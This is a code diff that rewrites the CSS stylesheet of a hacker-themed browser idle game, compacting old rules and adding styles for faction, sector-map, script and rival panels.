@@ -9,181 +9,209 @@
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
 <style>
-  :root {
-    --green:#00ff41;--gdim:#00aa2a;--gdark:#003a0f;
-    --amber:#ffb700;--red:#ff2d2d;--blue:#00d4ff;--purple:#cc44ff;
-    --bg:#050a05;--bg2:#080f08;--bg3:#0d180d;--border:#1a3a1a;--dim:#4a7a4a;
-  }
+  :root{--g:#00ff41;--gd:#00aa2a;--gk:#003a0f;--a:#ffb700;--r:#ff2d2d;--b:#00d4ff;--p:#cc44ff;--bg:#050a05;--b2:#080f08;--b3:#0d180d;--br:#1a3a1a;--dim:#4a7a4a;}
   *{margin:0;padding:0;box-sizing:border-box;}
   html,body{height:100%;background:#050a05;color:#00ff41;font-family:'Share Tech Mono',monospace;overflow:hidden;-webkit-user-select:none;user-select:none;}
-  #crt{position:fixed;top:0;left:0;right:0;bottom:0;pointer-events:none;z-index:9999;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,.025) 2px,rgba(0,255,65,.025) 4px);}
-  #vig{position:fixed;top:0;left:0;right:0;bottom:0;pointer-events:none;z-index:9998;background:-webkit-radial-gradient(center,ellipse,transparent 55%,rgba(0,0,0,.8) 100%);background:radial-gradient(ellipse at center,transparent 55%,rgba(0,0,0,.8) 100%);}
+  #crt{position:fixed;inset:0;pointer-events:none;z-index:9999;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,.022) 2px,rgba(0,255,65,.022) 4px);}
+  #vig{position:fixed;inset:0;pointer-events:none;z-index:9998;background:radial-gradient(ellipse at center,transparent 55%,rgba(0,0,0,.8) 100%);}
+  #app{display:flex;flex-direction:column;height:100vh;height:100dvh;max-width:480px;margin:0 auto;border-left:1px solid #1a3a1a;border-right:1px solid #1a3a1a;}
+  /* HEADER */
+  #hdr{padding:6px 12px;background:#080f08;border-bottom:1px solid #1a3a1a;display:flex;flex-direction:column;gap:4px;flex-shrink:0;}
+  #hdr-top{display:flex;justify-content:space-between;align-items:center;}
+  #logo{font-family:'Orbitron',monospace;font-size:14px;font-weight:900;letter-spacing:4px;color:#00ff41;text-shadow:0 0 10px #00ff41,0 0 20px #00ff41;}
+  #hdr-right{display:flex;align-items:center;gap:10px;}
+  #alias{font-size:10px;color:#4a7a4a;}#alias span{color:#ffb700;}
+  #snd-btn{background:none;border:none;font-size:14px;cursor:pointer;color:#4a7a4a;-webkit-appearance:none;appearance:none;-webkit-tap-highlight-color:transparent;padding:2px 4px;}
+  #snd-btn.on{color:#00ff41;}
+  #stats{display:flex;gap:8px;font-size:10px;color:#4a7a4a;flex-wrap:wrap;}
+  #stats .sv{color:#00ff41;}
+  #faction-bar{font-size:10px;display:none;}#faction-bar.on{display:block;}
+  #faction-cipher{color:#cc44ff;}#faction-ghost{color:#00d4ff;}
+  #qind{font-size:10px;color:#4a7a4a;display:none;}#qind.on{display:block;}#qind span{color:#00d4ff;}
+  #heatrow{display:flex;align-items:center;gap:8px;font-size:10px;}
+  #hlbl{color:#4a7a4a;width:36px;flex-shrink:0;}
+  #htrk{flex:1;height:5px;background:#0d180d;border:1px solid #1a3a1a;border-radius:2px;overflow:hidden;}
+  #hfill{height:100%;width:0%;background:#00ff41;border-radius:2px;transition:width .3s,background .3s;}
+  #hpct{width:30px;text-align:right;color:#00ff41;font-size:10px;}
+  #htrk.pulse{animation:heat-pulse .4s ease-out;}
+  @keyframes heat-pulse{0%{box-shadow:0 0 0 rgba(255,45,45,0);}50%{box-shadow:0 0 8px rgba(255,45,45,.6);}100%{box-shadow:0 0 0 rgba(255,45,45,0);}}
+  /* Market ticker */
+  #market-ticker{font-size:9px;color:#4a7a4a;display:none;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+  #market-ticker.active{display:block;}
+  #market-ticker .mt-val{color:#ffb700;}
+  #market-ticker .mt-warn{color:#ff2d2d;}
+  /* TERMINAL */
+  #term-area{display:flex;flex-direction:column;flex:1;overflow:hidden;}
+  #term{flex:1;overflow-y:scroll;overflow-x:hidden;-webkit-overflow-scrolling:touch;touch-action:pan-y;padding:10px 12px;background:#050a05;font-size:12px;line-height:1.7;}
+  #term::-webkit-scrollbar{width:3px;}#term::-webkit-scrollbar-thumb{background:#003a0f;border-radius:2px;}
+  .ll{display:block;word-break:break-all;}
+  .ok{color:#00ff41;}.warn{color:#ffb700;}.err{color:#ff2d2d;}.info{color:#00d4ff;}.dim{color:#4a7a4a;}.sep{color:#1a3a1a;}.proc{color:#cc44ff;}
+  .story{color:#ffb700;}.void{color:#cc44ff;font-style:italic;}.cipher{color:#cc44ff;}.ghost{color:#00d4ff;}
+  /* CMD AREA */
+  #cmd-area{background:#080f08;border-top:1px solid #1a3a1a;padding:7px 12px;flex-shrink:0;}
+  #phlbl{font-size:9px;letter-spacing:2px;color:#4a7a4a;margin-bottom:3px;display:none;}
+  #phlbl.on{display:block;}#phlbl.proc{color:#cc44ff;}
+  #countdown{font-size:11px;color:#cc44ff;margin-bottom:4px;display:none;text-align:center;letter-spacing:2px;}
+  #countdown.on{display:block;}
+  #progwrap{display:none;margin-bottom:5px;gap:8px;align-items:center;font-size:10px;}
+  #progwrap.on{display:flex;}
+  #proglbl{color:#4a7a4a;min-width:52px;font-size:9px;letter-spacing:1px;}
+  #progtrk{flex:1;height:8px;background:#0d180d;border:1px solid #1a3a1a;border-radius:2px;overflow:hidden;}
+  #progfill{height:100%;width:0%;background:linear-gradient(90deg,#003a0f,#00ff41);transition:width .15s;border-radius:2px;box-shadow:0 0 5px #00ff41;}
+  #progfill.proc{background:linear-gradient(90deg,#330055,#cc44ff);box-shadow:0 0 5px #cc44ff;}
+  #progpct{color:#00ff41;width:34px;text-align:right;}
+  #prestage{display:none;margin-bottom:5px;padding:5px 8px;border:1px dashed #1a3a1a;border-radius:3px;}
+  #prestage.on{display:block;}
+  #prestage-lbl{font-size:9px;color:#4a7a4a;letter-spacing:1px;margin-bottom:2px;}
+  #prestage-cmd{font-size:11px;display:flex;align-items:center;gap:3px;overflow:hidden;}
+  #prestage-prompt{color:#4a7a4a;flex-shrink:0;font-size:10px;}
+  #prestage-typed{color:#00ff41;}#prestage-rest{color:#1a3a1a;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+  #prestage-cursor{width:6px;height:12px;background:#00aa2a;display:inline-block;flex-shrink:0;animation:blink 1s step-end infinite;}
+  #cmddisplay{font-size:11px;min-height:17px;margin-bottom:6px;display:flex;align-items:center;gap:4px;overflow:hidden;}
+  #cmdprompt{color:#4a7a4a;flex-shrink:0;}#cmdtxt{color:#00ff41;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+  #cmdcursor{width:7px;height:13px;background:#00ff41;display:inline-block;flex-shrink:0;animation:blink 1s step-end infinite;}
+  @keyframes blink{50%{opacity:0;}}
+  /* BUTTONS */
+  button{-webkit-appearance:none;appearance:none;-webkit-tap-highlight-color:transparent;touch-action:manipulation;border-radius:4px;}
+  #tapbtn{width:100%;padding:13px;background:#0d180d;border:1px solid #003a0f;color:#00ff41;font-family:'Share Tech Mono',monospace;font-size:13px;letter-spacing:2px;cursor:pointer;text-transform:uppercase;display:block;transition:all .1s;}
+  #tapbtn:active{background:#003a0f;transform:scale(.98);box-shadow:0 0 10px #00ff41;}
+  #tapbtn.proc{border-color:#330055;color:#cc44ff;background:#0d0018;}
+  #tapbtn.none{border-color:#1a3a1a;color:#4a7a4a;}
+  #tapbtn.idle{border-color:#4a7a4a;color:#4a7a4a;font-size:11px;}
+  #tapbtn.locked{opacity:.3;pointer-events:none;}
+  #tapbtn.interrupt{border-color:#ff2d2d;color:#ff2d2d;background:#1a0000;animation:pred .6s ease-in-out infinite;}
+  @keyframes pred{50%{box-shadow:0 0 15px #ff2d2d;}}
+  /* NAV */
+  #botnav{display:flex;border-top:1px solid #1a3a1a;background:#080f08;flex-shrink:0;padding-bottom:env(safe-area-inset-bottom,0px);position:relative;z-index:160;}
+  .nb{flex:1;padding:12px 2px 10px;background:transparent;border:none;border-right:1px solid #1a3a1a;border-top:2px solid transparent;color:#4a7a4a;font-family:'Share Tech Mono',monospace;font-size:10px;letter-spacing:0px;cursor:pointer;text-transform:uppercase;-webkit-appearance:none;appearance:none;-webkit-tap-highlight-color:transparent;transition:color .2s,background .2s,border-top-color .2s;}
+  .nb:last-child{border-right:none;}.nb.act{color:#00ff41;background:#0d180d;border-top-color:#00ff41;}.nb:active{background:#003a0f;color:#00ff41;}
+  /* PANEL */
+  #panel{display:none;position:fixed;bottom:calc(44px + env(safe-area-inset-bottom,0px));left:50%;transform:translateX(-50%);width:100%;max-width:480px;background:#080f08;border-top:2px solid #003a0f;max-height:58vh;z-index:150;}
+  #panel.on{display:block;}
+  .phdr{padding:10px 12px;border-bottom:1px solid #1a3a1a;font-family:'Orbitron',monospace;font-size:11px;letter-spacing:3px;color:#00aa2a;display:flex;justify-content:space-between;align-items:center;flex-shrink:0;background:#080f08;}
+  .pclose{background:none;border:none;color:#4a7a4a;font-size:16px;cursor:pointer;font-family:'Share Tech Mono',monospace;padding:0 4px;-webkit-appearance:none;appearance:none;}
+  #panel-content{height:calc(58vh - 42px);overflow-y:auto;overflow-x:hidden;-webkit-overflow-scrolling:touch;touch-action:pan-y;}
+  #panel-content::-webkit-scrollbar{width:3px;}#panel-content::-webkit-scrollbar-thumb{background:#003a0f;}
+  /* FACTION CHOICE */
+  .faction-card{margin:10px;padding:14px;border:1px solid #1a3a1a;border-radius:4px;cursor:pointer;transition:all .2s;}
+  .faction-card.cipher{border-color:#330055;background:rgba(204,68,255,.05);}
+  .faction-card.cipher:active{background:rgba(204,68,255,.15);}
+  .faction-card.ghost{border-color:#003a55;background:rgba(0,212,255,.05);}
+  .faction-card.ghost:active{background:rgba(0,212,255,.1);}
+  .faction-title{font-size:13px;font-family:'Orbitron',monospace;letter-spacing:2px;margin-bottom:6px;}
+  .faction-desc{font-size:10px;color:#4a7a4a;line-height:1.6;}
+  /* NETWORK MAP */
+  #map-container{padding:12px;font-size:11px;line-height:1.6;color:#4a7a4a;}
+  #map-canvas{font-family:'Share Tech Mono',monospace;font-size:11px;line-height:1.5;white-space:pre;color:#4a7a4a;margin-bottom:12px;}
+  .map-node{cursor:pointer;}
+  .map-legend{font-size:9px;color:#4a7a4a;border-top:1px solid #1a3a1a;padding-top:8px;margin-top:4px;}
+  /* MISSION CARDS */
+  /* Mission cards — left stripe shows type, cleaner layout */
+  .mc{margin:6px 10px;padding:10px 10px 10px 14px;border:1px solid #1a3a1a;border-left:3px solid #1a3a1a;border-radius:4px;background:#050a05;cursor:pointer;position:relative;transition:border-color .2s,background .2s;}
+  .mc:active{background:#0d180d;}
+  .mc.type-recon{border-left-color:#ffb700;}
+  .mc.type-crack{border-left-color:#ff2d2d;}
+  .mc.type-exfil{border-left-color:#00d4ff;}
+  .mc.queued{border-color:#00d4ff;background:rgba(0,212,255,.04);}
+  .mc.active-m{border-color:#00ff41;border-left-color:#00ff41;background:#0d180d;}
+  .mc.locked{opacity:.32;cursor:not-allowed;}
+  .mc.intel{border-right:2px solid #ffb700;}
+  .mc.cipher-m{border-right:2px solid #cc44ff;}.mc.ghost-m{border-right:2px solid #00d4ff;}
+  .mtitle{font-size:14px;color:#00ff41;margin-bottom:4px;display:flex;justify-content:space-between;align-items:center;gap:8px;line-height:1.2;}
+  .mtag{font-size:9px;padding:2px 6px;border-radius:2px;background:#003a0f;color:#00ff41;flex-shrink:0;letter-spacing:1px;}
+  .mtag.exfil{background:#001a3a;color:#00d4ff;}.mtag.crack{background:#2a0000;color:#ff2d2d;}.mtag.recon{background:#1a1a00;color:#ffb700;}
+  .mdesc{font-size:11px;color:#4a7a4a;margin-bottom:6px;line-height:1.5;}
+  .mreward{display:flex;gap:12px;font-size:11px;margin-bottom:3px;}
+  .mreward span{color:#4a7a4a;}.mreward .v{color:#ffb700;font-size:12px;}
+  .mmeta{display:flex;gap:10px;font-size:10px;flex-wrap:wrap;}
+  .mmeta span{color:#4a7a4a;}.mmeta .v{color:#4a7a4a;}
+  .qbadge,.intel-badge{position:absolute;top:8px;right:36px;font-size:9px;letter-spacing:1px;}
+  .qbadge{color:#00d4ff;}.intel-badge{color:#ffb700;}
+  .pbar-row{display:flex;align-items:center;gap:6px;font-size:9px;margin-top:4px;}
+  .pbar-lbl{color:#4a7a4a;width:40px;}.pbar-trk{flex:1;height:3px;background:#0d180d;border:1px solid #1a3a1a;border-radius:1px;overflow:hidden;}.pbar-fill{height:100%;background:#003a0f;border-radius:1px;}
+  /* UPGRADES */
+  .usec{padding:8px 12px 3px;font-size:9px;color:#4a7a4a;letter-spacing:2px;text-transform:uppercase;border-top:1px solid #1a3a1a;}
+  .usec:first-child{border-top:none;}
+  .uc{margin:4px 10px;padding:9px 12px;border:1px solid #1a3a1a;border-radius:4px;background:#050a05;cursor:pointer;display:flex;justify-content:space-between;align-items:center;transition:all .15s;}
+  .uc:active{background:#0d180d;}.uc.maxed{opacity:.45;cursor:not-allowed;}.uc.broke{opacity:.55;}
+  .uinfo{flex:1;}.uname{font-size:12px;color:#00ff41;margin-bottom:2px;}.udesc{font-size:10px;color:#4a7a4a;}
+  .ucost{text-align:right;font-size:11px;}.ucost .cv{color:#ffb700;}
+  /* INTERRUPT */
+  #int-ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.88);z-index:500;align-items:center;justify-content:center;}
+  #int-ov.on{display:flex;}
+  #intbox{background:#080f08;border:2px solid #ff2d2d;border-radius:6px;padding:18px;max-width:340px;width:92%;box-shadow:0 0 30px rgba(255,45,45,.3);}
+  #int-title{font-family:'Orbitron',monospace;font-size:12px;color:#ff2d2d;letter-spacing:3px;margin-bottom:8px;}
+  #int-body{font-size:11px;color:#4a7a4a;margin-bottom:12px;line-height:1.7;}
+  #int-timer{font-size:22px;font-family:'Orbitron',monospace;color:#ff2d2d;text-align:center;margin-bottom:12px;letter-spacing:4px;}
+  #int-actions{display:flex;gap:8px;flex-direction:column;}
+  .ibtn{padding:11px;background:transparent;border:1px solid #ff2d2d;color:#ff2d2d;font-family:'Share Tech Mono',monospace;font-size:11px;letter-spacing:2px;cursor:pointer;text-transform:uppercase;-webkit-appearance:none;appearance:none;border-radius:4px;transition:all .1s;text-align:left;}
+  .ibtn:active{background:rgba(255,45,45,.15);}
+  .ibtn.safe{border-color:#00d4ff;color:#00d4ff;}.ibtn.safe:active{background:rgba(0,212,255,.1);}
+  .ibtn.risky{border-color:#ffb700;color:#ffb700;}.ibtn.risky:active{background:rgba(255,183,0,.1);}
+  /* SYSTEM */
+  #repdisp{text-align:center;margin:10px;font-size:11px;color:#4a7a4a;}
+  #repdisp .rv{color:#ffb700;font-size:14px;font-family:'Orbitron',monospace;}
+  #pressec{margin:8px 10px;padding:12px;border:1px solid #ff2d2d;border-radius:4px;background:rgba(255,45,45,.04);}
+  #prestitle{font-family:'Orbitron',monospace;font-size:11px;color:#ff2d2d;margin-bottom:6px;letter-spacing:2px;}
+  #presdesc{font-size:10px;color:#4a7a4a;margin-bottom:10px;line-height:1.6;}
+  #presbtn{width:100%;padding:10px;background:transparent;border:1px solid #ff2d2d;border-radius:4px;color:#ff2d2d;font-family:'Share Tech Mono',monospace;font-size:11px;letter-spacing:3px;cursor:pointer;text-transform:uppercase;-webkit-appearance:none;appearance:none;}
+  #presbtn:active{background:rgba(255,45,45,.15);}#presbtn:disabled{opacity:.3;cursor:not-allowed;}
+  /* OFFLINE */
+  #offmod{display:none;position:fixed;inset:0;background:rgba(0,0,0,.88);z-index:1000;align-items:center;justify-content:center;}
+  #offmod.on{display:flex;}
+  #offbox{background:#080f08;border:1px solid #003a0f;border-radius:4px;padding:18px;max-width:300px;width:90%;}
+  #offbox h2{font-family:'Orbitron',monospace;font-size:11px;color:#00ff41;letter-spacing:3px;margin-bottom:10px;}
+  #offlog{font-size:11px;line-height:1.8;color:#4a7a4a;margin-bottom:14px;}#offlog .hi{color:#00ff41;}
+  #offok{width:100%;padding:10px;background:#003a0f;border:1px solid #00ff41;border-radius:4px;color:#00ff41;font-family:'Share Tech Mono',monospace;font-size:11px;letter-spacing:2px;cursor:pointer;-webkit-appearance:none;appearance:none;}
+  /* FX */
+  .cfloat{position:fixed;pointer-events:none;font-family:'Orbitron',monospace;font-size:13px;color:#ffb700;text-shadow:0 0 8px #ffb700;z-index:500;animation:fup 1.2s ease-out forwards;}
+  @keyframes fup{0%{opacity:1;transform:translateY(0);}100%{opacity:0;transform:translateY(-40px);}}
+  @keyframes glitch{0%,100%{transform:translate(0);filter:none;}20%{transform:translate(-4px,2px);filter:hue-rotate(90deg);}40%{transform:translate(4px,-2px);filter:hue-rotate(180deg) brightness(2);}60%{transform:translate(-2px,4px);filter:hue-rotate(270deg);}80%{transform:translate(2px,-4px);filter:brightness(3);}}
+  .glitch{animation:glitch .4s ease forwards;}
+  /* TERMINAL TABS */
+  #term-tabs{display:flex;background:#050a05;border-bottom:1px solid #1a3a1a;flex-shrink:0;}
+  .ttab{flex:1;padding:6px 4px;background:transparent;border:none;border-right:1px solid #1a3a1a;color:#4a7a4a;font-family:'Share Tech Mono',monospace;font-size:9px;letter-spacing:1px;cursor:pointer;-webkit-appearance:none;appearance:none;-webkit-tap-highlight-color:transparent;}
+  .ttab:last-child{border-right:none;}.ttab.act{color:#00ff41;background:#0d180d;}.ttab:active{color:#00ff41;}
+  #msg-badge{color:#ffb700;animation:pulse-badge .8s ease-in-out infinite;}
+  @keyframes pulse-badge{50%{opacity:.3;}}
+  .tpane{display:none;height:100%;overflow-y:scroll;overflow-x:hidden;-webkit-overflow-scrolling:touch;touch-action:pan-y;padding:10px 12px;background:#050a05;font-size:12px;line-height:1.7;}
+  .tpane.act{display:block;}
+  .tpane::-webkit-scrollbar{width:3px;}.tpane::-webkit-scrollbar-thumb{background:#003a0f;border-radius:2px;}
 
-#app{display:-webkit-flex;display:flex;-webkit-flex-direction:column;flex-direction:column;height:100vh;height:100dvh;max-width:480px;margin:0 auto;border-left:1px solid #1a3a1a;border-right:1px solid #1a3a1a;}
+/* SECTOR MAP */
+.sector-tab{display:inline-block;padding:3px 8px;margin:0 3px 6px 0;font-size:9px;border:1px solid #1a3a1a;border-radius:2px;cursor:pointer;color:#4a7a4a;-webkit-tap-highlight-color:transparent;}
+.sector-tab.act{border-color:#00ff41;color:#00ff41;background:#0d180d;}
+.sector-tab.locked{opacity:.3;cursor:not-allowed;}
+.sector-tab.rival-cipher{border-color:#330055;color:#cc44ff;}
+.sector-tab.rival-ghost{border-color:#003a55;color:#00d4ff;}
 
-/* HEADER */
-#hdr{padding:7px 12px;background:#080f08;border-bottom:1px solid #1a3a1a;display:-webkit-flex;display:flex;-webkit-flex-direction:column;flex-direction:column;gap:4px;-webkit-flex-shrink:0;flex-shrink:0;}
-#hdr-top{display:-webkit-flex;display:flex;-webkit-justify-content:space-between;justify-content:space-between;-webkit-align-items:center;align-items:center;}
-#logo{font-family:‘Orbitron’,monospace;font-size:15px;font-weight:900;letter-spacing:4px;color:#00ff41;text-shadow:0 0 10px #00ff41,0 0 20px #00ff41;}
-#alias{font-size:10px;color:#4a7a4a;}
-#alias span{color:#ffb700;}
-#stats{display:-webkit-flex;display:flex;gap:9px;font-size:10px;color:#4a7a4a;-webkit-flex-wrap:wrap;flex-wrap:wrap;}
-#stats .sv{color:#00ff41;}
-#qind{font-size:10px;color:#4a7a4a;display:none;}
-#qind.on{display:block;}
-#qind span{color:#00d4ff;}
-#heatrow{display:-webkit-flex;display:flex;-webkit-align-items:center;align-items:center;gap:8px;font-size:10px;}
-#hlbl{color:#4a7a4a;width:36px;-webkit-flex-shrink:0;flex-shrink:0;}
-#htrk{-webkit-flex:1;flex:1;height:5px;background:#0d180d;border:1px solid #1a3a1a;border-radius:2px;overflow:hidden;}
-#hfill{height:100%;width:0%;background:#00ff41;border-radius:2px;-webkit-transition:width .3s,background .3s;transition:width .3s,background .3s;}
-#hpct{width:30px;text-align:right;color:#00ff41;font-size:10px;}
+/* SCRIPTS PANEL */
+.script-card{margin:6px 10px;padding:9px 12px;border:1px solid #1a3a1a;border-radius:4px;background:#050a05;display:flex;justify-content:space-between;align-items:center;gap:8px;}
+.script-card.deployed{border-color:#00aa2a;background:#030803;}
+.script-info{flex:1;}
+.script-name{font-size:11px;color:#00ff41;margin-bottom:2px;}
+.script-desc{font-size:10px;color:#4a7a4a;}
+.script-stats{font-size:9px;color:#4a7a4a;margin-top:2px;}
+.script-btn{padding:5px 10px;background:transparent;border:1px solid #003a0f;color:#00aa2a;font-family:‘Share Tech Mono’,monospace;font-size:9px;letter-spacing:1px;cursor:pointer;border-radius:3px;-webkit-appearance:none;appearance:none;flex-shrink:0;}
+.script-btn.active{border-color:#ff2d2d;color:#ff2d2d;}
+.slot-bar{margin:8px 10px 4px;padding:8px 12px;border:1px solid #1a3a1a;border-radius:4px;font-size:10px;color:#4a7a4a;}
+.slot-track{display:flex;gap:3px;margin-top:4px;}
+.slot-pip{width:12px;height:12px;border:1px solid #1a3a1a;border-radius:2px;background:#0d180d;}
+.slot-pip.used{background:#00ff41;border-color:#00aa2a;}
+.slot-pip.used.mining{background:#ffb700;border-color:#aa7700;}
 
-/* TERMINAL */
-#term{-webkit-flex:1;flex:1;overflow-y:scroll;overflow-x:hidden;-webkit-overflow-scrolling:touch;touch-action:pan-y;padding:10px 12px;background:#050a05;font-size:12px;line-height:1.7;}
-#term::-webkit-scrollbar{width:3px;}
-#term::-webkit-scrollbar-thumb{background:#003a0f;border-radius:2px;}
-.ll{display:block;word-break:break-all;}
-.ok{color:#00ff41;}.warn{color:#ffb700;}.err{color:#ff2d2d;}.info{color:#00d4ff;}.dim{color:#4a7a4a;}.sep{color:#1a3a1a;}.proc{color:#cc44ff;}.story{color:#ffb700;font-style:italic;}
+/* RIVAL NODE */
+.rival-card{margin:6px 10px;padding:8px 12px;border:1px solid #330055;border-radius:4px;background:rgba(204,68,255,.04);cursor:pointer;font-size:10px;}
+.rival-card.ghost-rival{border-color:#003a55;background:rgba(0,212,255,.04);}
+.rival-card:active{opacity:.7;}
 
-/* CMD AREA */
-#cmd-area{background:#080f08;border-top:1px solid #1a3a1a;padding:7px 12px;-webkit-flex-shrink:0;flex-shrink:0;}
-#phlbl{font-size:9px;letter-spacing:2px;color:#4a7a4a;margin-bottom:3px;display:none;}
-#phlbl.on{display:block;}
-#phlbl.proc{color:#cc44ff;}
-
-/* countdown */
-#countdown{font-size:11px;color:#cc44ff;margin-bottom:4px;display:none;text-align:center;letter-spacing:2px;}
-#countdown.on{display:block;}
-
-#progwrap{display:none;margin-bottom:5px;gap:8px;-webkit-align-items:center;align-items:center;font-size:10px;}
-#progwrap.on{display:-webkit-flex;display:flex;}
-#proglbl{color:#4a7a4a;min-width:52px;font-size:9px;letter-spacing:1px;}
-#progtrk{-webkit-flex:1;flex:1;height:8px;background:#0d180d;border:1px solid #1a3a1a;border-radius:2px;overflow:hidden;}
-#progfill{height:100%;width:0%;background:linear-gradient(90deg,#003a0f,#00ff41);-webkit-transition:width .15s;transition:width .15s;border-radius:2px;box-shadow:0 0 5px #00ff41;}
-#progfill.proc{background:linear-gradient(90deg,#330055,#cc44ff);box-shadow:0 0 5px #cc44ff;}
-#progpct{color:#00ff41;width:34px;text-align:right;}
-
-/* pre-stage area */
-#prestage{display:none;margin-bottom:5px;padding:6px 8px;border:1px dashed #1a3a1a;border-radius:3px;background:rgba(0,255,65,.03);}
-#prestage.on{display:block;}
-#prestage-lbl{font-size:9px;color:#4a7a4a;letter-spacing:1px;margin-bottom:3px;}
-#prestage-cmd{font-size:11px;display:-webkit-flex;display:flex;-webkit-align-items:center;align-items:center;gap:3px;overflow:hidden;}
-#prestage-prompt{color:#4a7a4a;-webkit-flex-shrink:0;flex-shrink:0;font-size:10px;}
-#prestage-typed{color:#00ff41;}
-#prestage-rest{color:#1a3a1a;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
-#prestage-cursor{width:6px;height:12px;background:#00aa2a;display:inline-block;-webkit-flex-shrink:0;flex-shrink:0;animation:blink 1s step-end infinite;}
-
-#cmddisplay{font-size:11px;min-height:17px;margin-bottom:6px;display:-webkit-flex;display:flex;-webkit-align-items:center;align-items:center;gap:4px;overflow:hidden;}
-#cmdprompt{color:#4a7a4a;-webkit-flex-shrink:0;flex-shrink:0;}
-#cmdtxt{color:#00ff41;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
-#cmdcursor{width:7px;height:13px;background:#00ff41;display:inline-block;-webkit-flex-shrink:0;flex-shrink:0;animation:blink 1s step-end infinite;}
-@keyframes blink{50%{opacity:0;}}
-
-/* BUTTONS */
-button{-webkit-appearance:none;appearance:none;-webkit-tap-highlight-color:transparent;touch-action:manipulation;border-radius:4px;}
-#tapbtn{width:100%;padding:13px;background:#0d180d;border:1px solid #003a0f;color:#00ff41;font-family:‘Share Tech Mono’,monospace;font-size:13px;letter-spacing:2px;cursor:pointer;text-transform:uppercase;display:block;-webkit-appearance:none;appearance:none;-webkit-transition:all .1s;transition:all .1s;}
-#tapbtn:active{background:#003a0f;-webkit-transform:scale(.98);transform:scale(.98);box-shadow:0 0 10px #00ff41;}
-#tapbtn.proc{border-color:#330055;color:#cc44ff;background:#0d0018;}
-#tapbtn.none{border-color:#1a3a1a;color:#4a7a4a;}
-#tapbtn.idle{border-color:#4a7a4a;color:#4a7a4a;font-size:11px;}
-#tapbtn.locked{opacity:.3;pointer-events:none;}
-#tapbtn.interrupt{border-color:#ff2d2d;color:#ff2d2d;background:#1a0000;animation:pulse-red .6s ease-in-out infinite;}
-@keyframes pulse-red{50%{box-shadow:0 0 15px #ff2d2d;}}
-
-/* INTERRUPT OVERLAY */
-#interrupt-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.85);z-index:500;-webkit-align-items:center;align-items:center;-webkit-justify-content:center;justify-content:center;}
-#interrupt-overlay.on{display:-webkit-flex;display:flex;}
-#intbox{background:#080f08;border:2px solid #ff2d2d;border-radius:6px;padding:20px;max-width:340px;width:92%;box-shadow:0 0 30px rgba(255,45,45,.3);}
-#int-title{font-family:‘Orbitron’,monospace;font-size:13px;color:#ff2d2d;letter-spacing:3px;margin-bottom:8px;}
-#int-body{font-size:11px;color:#4a7a4a;margin-bottom:14px;line-height:1.7;}
-#int-timer{font-size:20px;font-family:‘Orbitron’,monospace;color:#ff2d2d;text-align:center;margin-bottom:14px;letter-spacing:4px;}
-#int-actions{display:-webkit-flex;display:flex;gap:8px;-webkit-flex-direction:column;flex-direction:column;}
-.int-btn{padding:12px;background:transparent;border:1px solid #ff2d2d;color:#ff2d2d;font-family:‘Share Tech Mono’,monospace;font-size:11px;letter-spacing:2px;cursor:pointer;text-transform:uppercase;-webkit-appearance:none;appearance:none;border-radius:4px;-webkit-transition:all .1s;transition:all .1s;text-align:left;}
-.int-btn:active{background:rgba(255,45,45,.15);}
-.int-btn.safe{border-color:#00d4ff;color:#00d4ff;}
-.int-btn.safe:active{background:rgba(0,212,255,.1);}
-.int-btn.risky{border-color:#ffb700;color:#ffb700;}
-.int-btn.risky:active{background:rgba(255,183,0,.1);}
-
-/* NAV */
-#botnav{display:-webkit-flex;display:flex;border-top:1px solid #1a3a1a;background:#080f08;-webkit-flex-shrink:0;flex-shrink:0;padding-bottom:env(safe-area-inset-bottom,0px);}
-.nb{-webkit-flex:1;flex:1;padding:11px 4px;background:transparent;border:none;border-right:1px solid #1a3a1a;color:#4a7a4a;font-family:‘Share Tech Mono’,monospace;font-size:10px;letter-spacing:1px;cursor:pointer;text-transform:uppercase;-webkit-appearance:none;appearance:none;-webkit-tap-highlight-color:transparent;-webkit-transition:color .2s,background .2s;transition:color .2s,background .2s;}
-.nb:last-child{border-right:none;}
-.nb.act{color:#00ff41;background:#0d180d;}
-.nb:active{background:#003a0f;color:#00ff41;}
-
-/* PANEL */
-#panel{display:none;position:fixed;bottom:0;left:50%;-webkit-transform:translateX(-50%);transform:translateX(-50%);width:100%;max-width:480px;background:#080f08;border-top:2px solid #003a0f;max-height:68vh;z-index:200;padding-bottom:env(safe-area-inset-bottom,0px);-webkit-flex-direction:column;flex-direction:column;}
-#panel.on{display:-webkit-flex;display:flex;}
-#panel-content{-webkit-flex:1;flex:1;overflow-y:auto;overflow-x:hidden;-webkit-overflow-scrolling:touch;touch-action:pan-y;}
-#panel-content::-webkit-scrollbar{width:3px;}
-#panel-content::-webkit-scrollbar-thumb{background:#003a0f;}
-.phdr{padding:11px 12px;border-bottom:1px solid #1a3a1a;font-family:‘Orbitron’,monospace;font-size:11px;letter-spacing:3px;color:#00aa2a;display:-webkit-flex;display:flex;-webkit-justify-content:space-between;justify-content:space-between;-webkit-align-items:center;align-items:center;-webkit-flex-shrink:0;flex-shrink:0;background:#080f08;}
-.pclose{background:none;border:none;color:#4a7a4a;font-size:16px;cursor:pointer;font-family:‘Share Tech Mono’,monospace;padding:0 4px;-webkit-appearance:none;appearance:none;}
-
-/* MISSION CARDS */
-.mc{margin:8px 10px;padding:11px 12px;border:1px solid #1a3a1a;border-radius:4px;background:#050a05;cursor:pointer;position:relative;-webkit-transition:border-color .2s,background .2s;transition:border-color .2s,background .2s;}
-.mc:active{background:#0d180d;border-color:#003a0f;}
-.mc.queued{border-color:#00d4ff;}
-.mc.active-m{border-color:#00ff41;background:#0d180d;}
-.mc.locked{opacity:.35;cursor:not-allowed;}
-.mc.intel{border-color:#ffb700;}
